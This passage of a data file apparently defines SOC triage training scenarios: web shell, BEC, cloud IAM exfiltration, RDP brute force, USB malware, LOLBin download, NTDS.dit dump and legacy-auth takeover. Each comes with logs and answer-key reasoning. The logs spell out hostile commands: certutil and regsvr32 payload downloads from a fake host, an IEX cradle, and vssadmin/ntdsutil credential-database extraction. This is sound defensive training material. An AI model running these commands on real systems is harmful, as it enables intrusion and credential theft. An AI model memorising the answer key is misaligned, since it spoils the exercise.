      ev(["16:20:00", "sysmon", "Sysmon (WEB-02)", "11", "File created", "WEB-02", "Path: C:\\inetpub\\wwwroot\\portal\\uploads\\img.aspx | Size: 4,211 bytes | Content: <%@ Page %> with ExecuteRequest cmd passthrough"]),
      ev(["16:25:31", "web", "WAF", "WEBSHELL", "Request to .aspx in uploads/", "WEB-02", "Src: 91.219.236.44 | Path: /portal/uploads/img.aspx?cmd=whoami"]),
      ev(["16:25:34", "sysmon", "Sysmon (WEB-02)", "1", "Process created", "WEB-02", "Image: cmd.exe | Parent: w3wp.exe | Cmd: whoami /all (via img.aspx)"]),
      ev(["16:26:10", "sysmon", "Sysmon (WEB-02)", "1", "Process created", "WEB-02", "Image: powershell.exe | Parent: w3wp.exe | Cmd: IEX (download cradle to 91.219.236.44)"]),
      ev(["16:30:00", "proxy", "Proxy", "EXFIL", "Outbound TLS connection", "WEB-02", "Src: WEB-02 | Dst: 91.219.236.44:443 | Bytes: sustained"])
    ],
    processes: [
      pr([1, null, "w3wp.exe", "C:\\Windows\\System32\\inetsrv\\w3wp.exe (IIS worker)", "IUSR", "Medium", false]),
      pr([2, 1, "cmd.exe", "cmd.exe /c whoami /all (via img.aspx webshell)", "IUSR", "Medium", true]),
      pr([3, 1, "powershell.exe", "powershell.exe IEX (download + stage 2)", "IUSR", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "delete-artifact", "block-ip", "esc-l2"],
      mitre: ["T1505.003", "T1190", "T1059.001"],
      reasoning: "TRUE POSITIVE — web shell on the public portal (T1505.003). The attacker uploaded img.aspx into the uploads folder, executed commands (whoami) through w3wp, and pulled a second stage via PowerShell (T1059.001). The exploit path into the portal (T1190) still needs confirming by the web team. Severity HIGH/P2: a public-facing server is compromised and being used as a foothold; keep the site online only if the WAF can block the path, otherwise take it offline. Isolate the host, remove the artifact and review the uploads folder, block the attacker IP, and escalate to L2."
    },
    keyEvidence: [
      { id: "intel-91.219.236.44" },
      { id: "search-aspx", keyword: "aspx" },
      { id: "search-w3wp", keyword: "w3wp" },
      { id: "process-tree" }
    ]
  },

  {
    id: "bec-invoice",
    title: "Invoice Fraud / BEC via Compromised Vendor Mailbox",
    difficulty: "Medium",
    category: "Email",
    summary: "A vendor mailbox was compromised, an inbox forwarding rule was created, and a fake invoice requested a wire transfer to a new account.",
    alert: {
      rule: "Exchange Online - Inbox Forwarding Rule to External Address",
      severity: "High",
      ts: "2024-03-04 10:30:00 UTC",
      host: "O365-EXO",
      user: "pricing@vendorco.com (external)",
      ips: ["89.248.172.10"],
      domains: ["vendorco-payments.com"],
      hashes: [],
      mitreHint: "T1114.003 (Email Forwarding Rule) + T1566.002 (Spearphishing Link)"
    },
    entities: { host: "O365-EXO", user: "j.bauer" },
    assets: {
      "O365-EXO": { role: "Microsoft 365 / Exchange Online", tier: "Cloud", os: "n/a", edr: "n/a (cloud)", owner: "IT" }
    },
    users: {
      "j.bauer": { dept: "Finance", title: "Accounts Payable Lead", groups: ["Finance", "AP-Approvers"], mfa: "Enabled", lastPw: "2023-08-19", risk: "None flagged" }
    },
    intel: {
      "vendorco-payments.com": { vt: "0/87 (too new)", abuse: "5% confidence", geo: "—", notes: "Domain registered 3 days ago. Slight homoglyph of vendorco.com (note the extra '-payments'). No MX records, no real website." },
      "89.248.172.10": { vt: "12/89", abuse: "63% confidence", geo: "RU", notes: "Hosting provider frequently used for credential phishing infrastructure." }
    },
    events: [
      ev(["10:30:00", "o365", "Exchange Online", "RULE", "Inbox rule created on vendor mailbox", "O365-EXO", "Mailbox: pricing@vendorco.com | Rule: Forward all mail to ap-admin@vendorco-payments.com | External: true"]),
      ev(["10:31:20", "o365", "Exchange Online", "RULE", "Mailbox access from new IP", "O365-EXO", "Mailbox: pricing@vendorco.com | IP: 89.248.172.10 | Protocol: EXCHANGE_WEB_SERVICES (first time)"]),
      ev(["10:45:00", "o365", "Exchange Online", "MALICIOUS", "Phishing email delivered", "O365-EXO", "From: pricing@vendorco-payments.com | To: j.bauer | Subject: Updated invoice #48211 | Link: vendorco-payments.com/invoice | Attachment: invoice.html (0 AV hits)"]),
      ev(["11:00:05", "o365", "Exchange Online", "SIGNIN", "Suspicious sign-in (legacy)", "O365-EXO", "User: j.bauer | IP: 185.220.101.34 | Auth: IMAP (no MFA challenge) | Location: TOR exit"]),
      ev(["11:12:00", "o365", "Exchange Online", "DETECT", "Forwarding rule created on j.bauer mailbox", "O365-EXO", "Mailbox: j.bauer | Rule: Forward all Finance-Shares notifications to ap-admin@vendorco-payments.com"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["disable-account", "reset-password", "quarantine-email", "notify-user", "esc-l2"],
      mitre: ["T1114.003", "T1566.002", "T1078.001"],
      reasoning: "TRUE POSITIVE — Business Email Compromise (T1114.003). The vendor mailbox was taken over (first-time logon from a flagged IP), a forwarding rule was added to intercept replies, and a lookalike domain (vendorco-payments.com, registered 3 days ago) delivered a fake invoice to AP. j.bauer's own mailbox then showed a legacy IMAP sign-in (no MFA) plus a forwarding rule — the BEC chain is now active on our side too. Severity HIGH/P2: pending wire-fraud risk against a real AP transaction. Disable j.bauer temporarily, force MFA re-enrollment, remove both forwarding rules, quarantine the campaign, and notify the user. Escalate to L2 for vendor notification and funds tracing."
    },
    keyEvidence: [
      { id: "intel-vendorco-payments.com" },
      { id: "search-imap", keyword: "imap" },
      { id: "search-rule", keyword: "rule" },
      { id: "user-j.bauer" }
    ]
  },

  {
    id: "cloud-iam",
    title: "Cloud IAM Credential Abuse & S3 Exfiltration",
    difficulty: "Hard",
    category: "Cloud",
    summary: "An EC2 instance role created a new IAM user, granted it read access to confidential buckets, and bulk-downloaded documents.",
    alert: {
      rule: "CloudTrail - IAM User Created by EC2 Instance Role (anomalous)",
      severity: "High",
      ts: "2024-03-11 19:00:00 UTC",
      host: "aws-account",
      user: "acp-web-role",
      ips: ["52.15.44.210"],
      domains: [],
      hashes: [],
      mitreHint: "T1078.004 (Cloud Account) + T1530 (Data from Cloud Storage)"
    },
    entities: { host: "aws-account", user: "acp-web-role" },
    assets: {
      "aws-account": { role: "AWS production account", tier: "Cloud", os: "n/a", edr: "n/a (cloud)", owner: "Cloud Team" }
    },
    users: {
      "acp-web-role": { dept: "Cloud", title: "EC2 web instance role", groups: ["aws", "ec2"], mfa: "n/a (instance role)", lastPw: "n/a", risk: "None flagged" }
    },
    intel: {
      "52.15.44.210": { vt: "0/91", abuse: "2% confidence", geo: "US (AWS)", notes: "Legitimate AWS range — benign. The suspicious activity is authenticated via API keys, not from this IP." }
    },
    events: [
      ev(["19:00:00", "cloudtrail", "CloudTrail", "CreateUser", "IAM user created", "aws-account", "Caller: acp-web-role | User: s3-exfil-acc | Region: us-east-1"]),
      ev(["19:00:12", "cloudtrail", "CloudTrail", "AttachUserPolicy", "Policy attached", "aws-account", "Caller: acp-web-role | Policy: AmazonS3ReadOnlyAccess | User: s3-exfil-acc"]),
      ev(["19:01:00", "cloudtrail", "CloudTrail", "CreateAccessKey", "Access key created", "aws-account", "Caller: acp-web-role | User: s3-exfil-acc"]),
      ev(["19:05:00", "cloudtrail", "CloudTrail", "ListBuckets", "Bucket enumeration", "aws-account", "Caller: s3-exfil-acc (AccessKey: AKIA...)| Result: 14 buckets listed"]),
      ev(["19:06:30", "cloudtrail", "CloudTrail", "GetObject", "Bulk object download", "aws-account", "Caller: s3-exfil-acc | Bucket: confidential-finance-docs | Objects: 2,300+ / 4.8 GB in 90s"]),
      ev(["19:08:00", "cloudtrail", "CloudTrail", "GetObject", "Bulk object download", "aws-account", "Caller: s3-exfil-acc | Bucket: hr-records-private | Objects: 1,100+ / 1.2 GB"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["disable-account", "block-hash", "esc-ir", "notify-manager"],
      mitre: ["T1078.004", "T1530", "T1098.001", "T1048"],
      reasoning: "TRUE POSITIVE — cloud account abuse and mass data theft (T1530). A compromised EC2 instance role (T1078.004) created an IAM user (T1098.001), attached read-only S3 access, and used new keys to download ~6 GB from confidential buckets (finance + HR) in minutes. Severity CRITICAL/P1: confirmed bulk exfiltration of regulated data. Disable s3-exfil-acc and rotate the instance role credentials, revoke the access keys, and escalate to IR + notify management — scope the bucket access logs for the full data exposure and engage DLP/legal."
    },
    keyEvidence: [
      { id: "search-createuser", keyword: "createuser" },
      { id: "search-getobject", keyword: "getobject" },
      { id: "search-s3-exfil-acc", keyword: "s3-exfil-acc" }
    ]
  },

  {
    id: "rdp-brute",
    title: "RDP Brute Force from Internet",
    difficulty: "Easy",
    category: "Network",
    summary: "Repeated RDP logon failures from a single external IP against the gateway, then one successful RDP session.",
    alert: {
      rule: "FW - RDP brute force (excessive 4625)",
      severity: "Medium",
      ts: "2024-03-15 05:00:00 UTC",
      host: "RD-GW-01",
      user: "unknown",
      ips: ["103.155.90.14"],
      domains: [],
      hashes: [],
      mitreHint: "T1110.001 (Password Guessing)"
    },
    entities: { host: "RD-GW-01", user: "m.haddad" },
    assets: {
      "RD-GW-01": { role: "RDP gateway (edge)", tier: "Edge", os: "Windows Server 2019", edr: "Healthy", owner: "Infrastructure" }
    },
    users: {
      "m.haddad": { dept: "Sales", title: "Regional Manager", groups: ["Sales", "Remote-Users"], mfa: "Enabled", lastPw: "2023-12-05", risk: "None flagged" }
    },
    intel: {
      "103.155.90.14": { vt: "6/92", abuse: "55% confidence", geo: "VN", notes: "Consumer ISP block. High volume of RDP/SSH brute force attempts reported across 20+ organizations." }
    },
    events: [
      ev(["03:40:00", "security", "Security (RD-GW-01)", "4625", "RDP logon failure", "RD-GW-01", "Account: administrator | IP: 103.155.90.14 | LogonType: 10"]),
      ev(["03:40:05", "security", "Security (RD-GW-01)", "4625", "RDP logon failure", "RD-GW-01", "Account: admin | IP: 103.155.90.14 | LogonType: 10"]),
      ev(["03:41:00", "security", "Security (RD-GW-01)", "4625", "RDP logon failure", "RD-GW-01", "Account: m.haddad | IP: 103.155.90.14 | LogonType: 10"]),
      ev(["03:42:30", "security", "Security (RD-GW-01)", "4625", "RDP logon failure", "RD-GW-01", "Account: guest | IP: 103.155.90.14 | LogonType: 10"]),
      ev(["04:10:15", "security", "Security (RD-GW-01)", "4625", "RDP logon failure", "RD-GW-01", "Account: m.haddad | IP: 103.155.90.14 | LogonType: 10"]),
      ev(["04:47:52", "security", "Security (RD-GW-01)", "4624", "RDP logon success", "RD-GW-01", "Account: m.haddad | IP: 103.155.90.14 | LogonType: 10 | MFA: Challenge completed"]),
      ev(["05:00:00", "security", "Security (RD-GW-01)", "4624", "RDP logon success (follow-up)", "RD-GW-01", "Account: m.haddad | IP: 103.155.90.14 | LogonType: 10 | MFA: Challenge completed"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["block-ip", "reset-password", "esc-l2", "monitor"],
      mitre: ["T1110.001", "T1078.001"],
      reasoning: "TRUE POSITIVE — RDP brute force (T1110.001) with a successful logon. The attacker guessed or reused a password for m.haddad after a sustained spray; the account is a Sales manager with remote-access rights. MFA was completed on the successful sessions, which lowers (but does not remove) the risk — the attacker may have phished the MFA code or used a stolen valid token. Severity HIGH/P2: valid credentials plus an interactive remote session from a hostile IP. Block the source IP at the edge, force a password reset, review MFA posture for the account, and escalate to L2 to check for post-logon activity."
    },
    keyEvidence: [
      { id: "intel-103.155.90.14" },
      { id: "search-4625", keyword: "4625" },
      { id: "search-m.haddad", keyword: "m.haddad" }
    ]
  },

  {
    id: "usb-malware",
    title: "USB Removable Media Malware",
    difficulty: "Easy",
    category: "Endpoint",
    summary: "A .lnk file from a USB drive was executed on a warehouse kiosk, dropping an executable that began C2 beaconing.",
    alert: {
      rule: "EDR - Process launched from removable media (Sysmon 1)",
      severity: "Medium",
      ts: "2024-03-20 08:00:00 UTC",
      host: "KIOSK-03",
      user: "WHS\\operator",
      ips: ["10.10.50.3"],
      domains: ["fonts-loader.tk"],
      hashes: [],
      mitreHint: "T1091 (Replication via Removable Media)"
    },
    entities: { host: "KIOSK-03", user: "operator" },
    assets: {
      "KIOSK-03": { role: "Warehouse kiosk (shared)", tier: "Tier 2", os: "Windows 10 (kiosk mode)", edr: "Healthy", owner: "Operations" }
    },
    users: {
      "operator": { dept: "Operations", title: "Shared kiosk operator account", groups: ["Kiosk"], mfa: "n/a", lastPw: "2023-07-01", risk: "Shared account" }
    },
    intel: {
      "10.10.50.3": { vt: "n/a", abuse: "n/a", geo: "—", notes: "KIOSK-03 internal address. The kiosk is a shared-floor device — the USB origin is the anomaly, not the host." },
      "fonts-loader.tk": { vt: "8/88", abuse: "72% confidence", geo: "PA", notes: "Very new TLD (.tk), only resolves to 45.155.205.23 (also flagged). Known family: USB-payload droppers used in logistics-targeted campaigns." }
    },
    events: [
      ev(["07:58:00", "sysmon", "Sysmon (KIOSK-03)", "18", "Removable media mounted", "KIOSK-03", "Drive: F:\\ | Type: USB mass storage | Serial: 08A1-9C34 (unknown device)"]),
      ev(["07:58:04", "sysmon", "Sysmon (KIOSK-03)", "1", "Process created", "KIOSK-03", "Image: F:\\Invoice_20240320.pdf.lnk | Parent: explorer.exe | User: operator"]),
      ev(["07:58:06", "sysmon", "Sysmon (KIOSK-03)", "1", "Process created", "KIOSK-03", "Image: C:\\Users\\Public\\winupdate.exe | Parent: F:\\Invoice_20240320.pdf.lnk | User: operator"]),
      ev(["07:59:00", "sysmon", "Sysmon (KIOSK-03)", "22", "DNS query", "KIOSK-03", "Image: winupdate.exe | Query: fonts-loader.tk | Status: 45.155.205.23"]),
      ev(["08:00:00", "sysmon", "Sysmon (KIOSK-03)", "3", "Network connection", "KIOSK-03", "Image: winupdate.exe | Src: 10.10.50.3:49123 | Dst: 45.155.205.23:443"])
    ],
    processes: [
      pr([1, null, "explorer.exe", "C:\\Windows\\explorer.exe (kiosk shell)", "WHS\\operator", "Low", false]),
      pr([2, 1, "F:\\Invoice_20240320.pdf.lnk", ".lnk disguised as PDF — lures user into double-click (T1204.002)", "WHS\\operator", "Medium", true]),
      pr([3, 2, "winupdate.exe", "C:\\Users\\Public\\winupdate.exe (dropped payload)", "WHS\\operator", "Medium", true]),
      pr([4, 3, "winupdate.exe", "Beacon to fonts-loader.tk (45.155.205.23:443)", "WHS\\operator", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-domain", "block-hash", "esc-l2"],
      mitre: ["T1091", "T1204.002", "T1105", "T1071.001"],
      reasoning: "TRUE POSITIVE — malware delivered via USB (T1091) and executed by user double-click (T1204.002). A USB stick mounted on the kiosk, a .lnk disguised as a PDF dropped winupdate.exe to the Public folder, and that binary beacons to a new flagged domain over 443 (T1071.001). Severity HIGH/P2: malware infection on a shared kiosk with a shared operator account; USB is a common precursor to targeted attacks. Isolate the kiosk, block the domain and hash, and escalate to L2 to hunt for the same USB payload on other kiosks and interview the operator about the stick's origin."
    },
    keyEvidence: [
      { id: "intel-fonts-loader.tk" },
      { id: "search-lnk", keyword: "lnk" },
      { id: "search-f-drive", keyword: "f:\\" },
      { id: "process-tree" }
    ]
  },

  {
    id: "lolbin-download",
    title: "LOLBin Download Cradle & Beaconing",
    difficulty: "Medium",
    category: "Endpoint",
    summary: "certutil downloaded a remote payload and regsvr32 ran it from a URL — classic living-off-the-land attack chain, followed by beaconing.",
    alert: {
      rule: "EDR - certutil downloading remote file",
      severity: "Medium",
      ts: "2024-03-28 21:00:00 UTC",
      host: "WKS-117",
      user: "l.vogel",
      ips: ["10.10.40.117"],
      domains: ["cdn-assets-mirror.com"],
      hashes: ["d8b6a2e7c91f4b3a..."],
      mitreHint: "T1218 (Signed Binary Execution) + T1105 (Ingress Tool Transfer)"
    },
    entities: { host: "WKS-117", user: "l.vogel" },
    assets: {
      "WKS-117": { role: "Desktop (Legal)", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "Legal" }
    },
    users: {
      "l.vogel": { dept: "Legal", title: "Paralegal", groups: ["Legal", "Contract-Shares"], mfa: "Enabled", lastPw: "2023-10-02", risk: "None flagged" }
    },
    intel: {
      "10.10.40.117": { vt: "n/a", abuse: "n/a", geo: "—", notes: "WKS-117 internal address. Host is legitimate — the anomaly is certutil/regsvr32 downloading remote executables." },
      "cdn-assets-mirror.com": { vt: "5/90", abuse: "48% confidence", geo: "DE", notes: "Registered 4 days ago; mirrors common CDN names but hosts executable content. No legitimate CDN would serve .tmp payloads." },
      "d8b6a2e7c91f4b3a...": { vt: "14/70", abuse: "—", geo: "—", notes: "Unsigned PE. High AV detection; referenced in recent downloader campaigns." }
    },
    events: [
      ev(["21:00:00", "security", "Security (WKS-117)", "4688", "Process created", "WKS-117", "Image: C:\\Windows\\System32\\certutil.exe | Args: -urlcache -split -f http://cdn-assets-mirror.com/u/9b.tmp C:\\Users\\lvogel\\AppData\\Local\\Temp\\upd.tmp | User: l.vogel"]),
      ev(["21:00:04", "sysmon", "Sysmon (WKS-117)", "3", "Network connection", "WKS-117", "Image: certutil.exe | Dst: cdn-assets-mirror.com:80 | Bytes: 512 KB (PE received)"]),
      ev(["21:00:10", "security", "Security (WKS-117)", "4688", "Process created", "WKS-117", "Image: C:\\Windows\\System32\\regsvr32.exe | Args: /s /u /i:http://cdn-assets-mirror.com/u/9b.sct scrobj.dll | User: l.vogel"]),
      ev(["21:01:00", "sysmon", "Sysmon (WKS-117)", "1", "Process created", "WKS-117", "Image: C:\\Users\\lvogel\\AppData\\Local\\Temp\\upd.tmp (from certutil) | Parent: regsvr32.exe | Signed: false"]),
      ev(["21:05:00", "sysmon", "Sysmon (WKS-117)", "3", "Network connection", "WKS-117", "Image: upd.tmp | Dst: cdn-assets-mirror.com:443 | Beacon every 60s"])
    ],
    processes: [
      pr([1, null, "certutil.exe", "certutil.exe -urlcache -split -f http://cdn-assets-mirror.com/u/9b.tmp (download stage, T1105)", "acorp\\l.vogel", "Medium", true]),
      pr([2, null, "regsvr32.exe", "regsvr32.exe /s /u /i:http://cdn-assets-mirror.com/u/9b.sct scrobj.dll (squiblydoo, T1218.010)", "acorp\\l.vogel", "Medium", true]),
      pr([3, 1, "C:\\Users\\lvogel\\AppData\\Local\\Temp\\upd.tmp", "upd.tmp (dropped payload from certutil)", "acorp\\l.vogel", "Medium", true]),
      pr([4, 3, "upd.tmp", "Beacon to cdn-assets-mirror.com:443", "acorp\\l.vogel", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-domain", "block-hash", "esc-l2"],
      mitre: ["T1218.010", "T1105", "T1204.002"],
      reasoning: "TRUE POSITIVE — living-off-the-land attack chain (T1218). certutil fetched a payload (T1105) while regsvr32 abused the scrobj.dll script handler (T1218.010 / Squiblydoo) — both legitimate Windows binaries evade app-allowlisting. The dropped unsigned upd.tmp then beacons to a 4-day-old domain. Severity HIGH/P2: malware execution on a Legal workstation with contract data. Isolate the host, block the domain and hash, and escalate to L2 to trace how the chain started — a phishing link is likely, so check the user's click history."
    },
    keyEvidence: [
      { id: "intel-cdn-assets-mirror.com" },
      { id: "search-certutil", keyword: "certutil" },
      { id: "search-regsvr32", keyword: "regsvr32" },
      { id: "process-tree" }
    ]
  },

  {
    id: "ntds-dump",
    title: "NTDS.dit Dump & DC Attack (Domain-Wide Impact)",
    difficulty: "Hard",
    category: "Identity/AD",
    summary: "A shadow copy and NTDS.dit extraction were performed on the domain controller, followed by anomalous Kerberos service-ticket requests.",
    alert: {
      rule: "EDR - ntdsutil / vssadmin shadow copy on Domain Controller",
      severity: "Critical",
      ts: "2024-04-02 02:00:00 UTC",
      host: "DC-01",
      user: "svc-monitor",
      ips: ["10.10.1.10"],
      domains: [],
      hashes: [],
      mitreHint: "T1003.003 (NTDS.dit)"
    },
    entities: { host: "DC-01", user: "svc-monitor" },
    assets: {
      "DC-01": { role: "Domain Controller", tier: "Tier 0", os: "Windows Server 2019", edr: "Healthy", owner: "Infrastructure" },
      "WKS-0888": { role: "Desktop (unknown asset)", tier: "Tier 2", os: "Windows 10", edr: "Not reporting", owner: "Unassigned" }
    },
    users: {
      "svc-monitor": { dept: "IT", title: "Monitoring service account", groups: ["Backup Operators", "Domain Admins (!!)"], mfa: "n/a", lastPw: "2021-04-01", risk: "Stale account in Domain Admins — flagged by audit" }
    },
    intel: {
      "10.10.1.10": { vt: "n/a", abuse: "n/a", geo: "—", notes: "DC-01 internal address. Legitimate source of shadow-copy/ntdsutil commands ONLY when IT runs backups — check change ticket: none exist for 02:00." }
    },
    events: [
      ev(["02:00:00", "security", "Security (DC-01)", "4688", "Process created", "DC-01", "Image: C:\\Windows\\System32\\cmd.exe | Cmd: vssadmin create shadow /for=C: | User: svc-monitor"]),
      ev(["02:00:30", "security", "Security (DC-01)", "4688", "Process created", "DC-01", "Image: ntdsutil.exe | Cmd: ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\exfil\" | User: svc-monitor"]),
      ev(["02:02:00", "sysmon", "Sysmon (DC-01)", "3", "Network connection", "DC-01", "Image: cmd.exe | Dst: 10.10.40.88 (WKS-0888) | Shares: ADMIN$ | Proto: SMB"]),
      ev(["02:05:00", "security", "Security (DC-01)", "4769", "Kerberos service ticket (unusual)", "DC-01", "Account: svc-monitor | Service: krbtgt | TicketOptions: 0x40810000 (renewable, forwardable) | Encryption: RC4 (should be AES)"]),
      ev(["02:20:00", "security", "Security (DC-01)", "4624", "Successful logon (odd source)", "DC-01", "Account: svc-monitor | Source: WKS-0888 | LogonType: 3 | Time: 02:20 (service account never logs on from desktops)"])
    ],
    processes: [
      pr([1, null, "cmd.exe", "cmd.exe (via WinRM from 10.10.40.88)", "acorp\\svc-monitor", "Medium", true]),
      pr([2, 1, "vssadmin.exe", "vssadmin create shadow /for=C: (create volume shadow for copy)", "acorp\\svc-monitor", "Medium", true]),
      pr([3, 1, "ntdsutil.exe", "ntdsutil activate instance ntds / ifm / create full ... (extract NTDS.dit + SYSTEM hive)", "acorp\\svc-monitor", "High", true]),
      pr([4, 1, "cmd.exe", "Copy C:\\Windows\\Temp\\exfil to \\\\WKS-0888\\ADMIN$ (off-box staging)", "acorp\\svc-monitor", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["disable-account", "reset-password", "isolate-host", "esc-ir", "notify-manager"],
      mitre: ["T1003.003", "T1550", "T1098", "T1482"],
      reasoning: "TRUE POSITIVE — domain controller compromise with full credential database theft (T1003.003). vssadmin + ntdsutil IFM created a copy of NTDS.dit (all password hashes) and it was staged off the DC to an unknown desktop at 02:00 with no change ticket. The RC4 (not AES) krbtgt service ticket suggests attacker-controlled ticket crafting (T1558) may be next. Severity CRITICAL/P1: the whole domain is compromised — every account password is now in attacker hands. Disable svc-monitor immediately, force krbtgt password reset (twice) per Microsoft guidance, isolate WKS-0888, and escalate to IR + notify SOC management NOW for org-wide response."
    },
    keyEvidence: [
      { id: "search-ntdsutil", keyword: "ntdsutil" },
      { id: "search-vssadmin", keyword: "vssadmin" },
      { id: "search-4769", keyword: "4769" },
      { id: "search-wks-0888", keyword: "wks-0888" },
      { id: "process-tree" }
    ]
  },

  {
    id: "cloud-exfil",
    title: "Data Exfiltration to Cloud Storage",
    difficulty: "Medium",
    category: "Network",
    summary: "A Finance analyst's host pushed a large volume of documents to a personal cloud-storage service over HTTPS shortly after reading the HR share.",
    alert: {
      rule: "Proxy Analytics - Unusual sustained upload volume",
      severity: "Medium",
      ts: "2024-04-09 15:30:00 UTC",
      host: "FIN-03",
      user: "c.nasser",
      ips: ["10.10.10.63"],
      domains: ["s3-uploadzone.biz"],
      hashes: [],
      mitreHint: "T1048.003 (Exfiltration Over Web Service)"
    },
    entities: { host: "FIN-03", user: "c.nasser" },
    assets: {
      "FIN-03": { role: "Workstation (Finance)", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "Finance" },
      "FS-HR": { role: "File server (HR records)", tier: "Tier 1", os: "Windows Server 2022", edr: "Healthy", owner: "HR" }
    },
    users: {
      "c.nasser": { dept: "Finance", title: "Payroll Analyst", groups: ["Finance", "HR-Records (inherited!)"], mfa: "Enabled", lastPw: "2023-05-20", risk: "Inherited HR access — unusual for role" }
    },
    intel: {
      "10.10.10.63": { vt: "n/a", abuse: "n/a", geo: "—", notes: "FIN-03 internal address. Host is legitimate — the anomaly is the unsanctioned upload destination and the HR data accessed." },
      "s3-uploadzone.biz": { vt: "2/89", abuse: "30% confidence", geo: "—", notes: "Generic cloud-storage front-end. Not on the sanctioned tools list; uploads bypass DLP by design." }
    },
    events: [
      ev(["15:02:00", "security", "Security (FS-HR)", "5140", "Network share object was accessed", "FS-HR", "Share: \\\\FS-HR\\HR-Records$ | User: c.nasser | IP: 10.10.10.63 | Access: Read"]),
      ev(["15:02:40", "security", "Security (FS-HR)", "5140", "Network share object was accessed", "FS-HR", "Share: \\\\FS-HR\\HR-Records$\\Terminations 2024 | User: c.nasser | Files: 220+ | Bulk copy"]),
      ev(["15:10:00", "proxy", "Proxy", "AUTH", "Logon to personal storage", "FIN-03", "User: c.nasser | Domain: s3-uploadzone.biz | Protocol: HTTPS | First-time login"]),
      ev(["15:15:00", "proxy", "Proxy", "UPLOAD", "Large upload", "FIN-03", "Src: FIN-03 | Dst: s3-uploadzone.biz | 410 MB in 5 min | MIME: zip"]),
      ev(["15:20:00", "proxy", "Proxy", "UPLOAD", "Large upload", "FIN-03", "Src: FIN-03 | Dst: s3-uploadzone.biz | 380 MB in 4 min | MIME: xlsx, pdf"]),
      ev(["15:30:00", "proxy", "Proxy", "UPLOAD", "Large upload", "FIN-03", "Src: FIN-03 | Dst: s3-uploadzone.biz | 520 MB in 6 min | Total session: ~1.3 GB"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["block-domain", "notify-user", "notify-manager", "esc-l2"],
      mitre: ["T1048.003", "T1005", "T1020"],
      reasoning: "TRUE POSITIVE — data exfiltration to an unsanctioned web service (T1048.003). c.nasser copied 220+ HR termination records from a share they should not access (inherited permission), then logged into a first-time cloud-storage domain and uploaded ~1.3 GB (zipped, xlsx, pdf) over HTTPS that bypasses DLP. Severity HIGH/P2: regulated HR data leaving the network. This could be insider risk OR a compromised account — do not alert the user yet without L2 guidance. Block the domain pending review, escalate to L2 (legal/HR/insider-risk lead), and preserve the proxy evidence."
    },
    keyEvidence: [
      { id: "intel-s3-uploadzone.biz" },
      { id: "search-5140", keyword: "5140" },
      { id: "search-hr-records", keyword: "hr-records" },
      { id: "user-c.nasser" }
    ]
  },

  {
    id: "legacy-auth",
    title: "MFA Bypass via Legacy Authentication",
    difficulty: "Medium",
    category: "Identity/Cloud",
    summary: "A mailbox was accessed via legacy IMAP (no MFA challenge) from an external IP, then an inbox rule began forwarding mail off-domain.",
    alert: {
      rule: "Identity Analytics - Legacy protocol logon for MFA-enabled user",
      severity: "High",
      ts: "2024-04-15 06:00:00 UTC",
      host: "O365-EXO",
      user: "p.winters",
      ips: ["185.220.101.7"],
      domains: ["mxfwd-server.net"],
      hashes: [],
      mitreHint: "T1078.001 (Valid Accounts) + T1114.003 (Forwarding Rule)"
    },
    entities: { host: "O365-EXO", user: "p.winters" },
    assets: {
      "O365-EXO": { role: "Microsoft 365 / Exchange Online", tier: "Cloud", os: "n/a", edr: "n/a (cloud)", owner: "IT" }
    },
    users: {
      "p.winters": { dept: "Executive", title: "VP Strategy", groups: ["Executives", "Strategy"], mfa: "Enabled", lastPw: "2023-09-01", risk: "Executive (high value target)" }
    },
    intel: {
      "185.220.101.7": { vt: "9/91", abuse: "68% confidence", geo: "RU (TOR)", notes: "TOR exit node. Legacy-IMAP logons from TOR for MFA-enabled users are strongly associated with account takeover." },
      "mxfwd-server.net": { vt: "3/86", abuse: "41% confidence", geo: "NL", notes: "Mail-forwarding service; often used to aggregate stolen mailbox content." }
    },
    events: [
      ev(["06:00:00", "o365", "Azure AD / EXO", "SIGNIN", "Legacy protocol logon", "O365-EXO", "User: p.winters | IP: 185.220.101.7 (TOR) | Protocol: IMAP | MFA: NOT challenged (legacy auth bypasses MFA) | App: IMAP4"]),
      ev(["06:05:30", "o365", "Exchange Online", "RULE", "Inbox rule created", "O365-EXO", "Mailbox: p.winters | Rule: Forward all mail matching 'confidential' to offsite@mxfwd-server.net | External: true"]),
      ev(["06:06:00", "o365", "Exchange Online", "RULE", "Inbox rule created", "O365-EXO", "Mailbox: p.winters | Rule: Move sent items to 'Deleted' (hide activity)"]),
      ev(["06:10:00", "o365", "Exchange Online", "MOVE", "Emails moved to deleted", "O365-EXO", "Mailbox: p.winters | Items: 400+ (Inbox → Deleted Items)"]),
      ev(["06:20:00", "o365", "Exchange Online", "SMTP", "Outbound mail relayed", "O365-EXO", "From: p.winters | To: offsite@mxfwd-server.net | Size: 18 MB (attachments: board minutes, M&A drafts)"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["disable-account", "reset-password", "block-ip", "quarantine-email", "esc-ir"],
      mitre: ["T1078.001", "T1114.003", "T1027", "T1530"],
      reasoning: "TRUE POSITIVE — executive mailbox takeover via legacy authentication (T1078.001). The MFA-enabled VP account was accessed over IMAP from a TOR exit — legacy protocols bypass MFA entirely, and Conditional Access should block them. The attacker created forwarding rules to exfiltrate confidential mail (T1114.003), hid sent items, and already relayed board minutes + M&A drafts off-domain. Severity CRITICAL/P1: active exfiltration of executive / board material. Disable the account NOW, force password reset + session revocation, remove the forwarding rules, block IMAP globally for MFA users, and escalate to IR — treat this as a high-impact breach."
    },
    keyEvidence: [
